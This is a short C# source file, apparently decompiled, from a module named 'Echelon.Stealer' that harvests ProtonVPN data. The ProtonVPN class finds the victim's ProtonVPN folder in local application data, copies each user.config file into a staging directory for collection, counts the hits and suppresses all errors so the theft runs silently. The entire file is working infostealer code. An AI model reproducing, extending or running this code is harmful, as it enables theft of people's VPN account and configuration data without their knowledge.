using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.VPN
{
	// Token: 0x02000018 RID: 24
	internal class ProtonVPN
	{
		// Token: 0x06000062 RID: 98 RVA: 0x0001A3A4 File Offset: 0x000185A4
		public static void GetProtonVPN(string Echelon_Dir)
		{
			try
			{
				string text = Help.LocalData + "\\ProtonVPN";
				if (Directory.Exists(text))
				{
					string[] directories = Directory.GetDirectories(text ?? "");
					Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\");
					foreach (string text2 in directories)
					{
						if (text2.StartsWith(text + "\\ProtonVPN\\ProtonVPN.exe"))
						{
							string name = new DirectoryInfo(text2).Name;
							string[] directories2 = Directory.GetDirectories(text2);
							Directory.CreateDirectory(string.Concat(new string[]
							{
								Echelon_Dir,
								"\\Vpn\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name
							}));
							File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
							{
								Echelon_Dir,
								"\\Vpn\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name,
								"\\user.config"
							}));
							ProtonVPN.count++;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000052 RID: 82
		public static int count;
	}
}
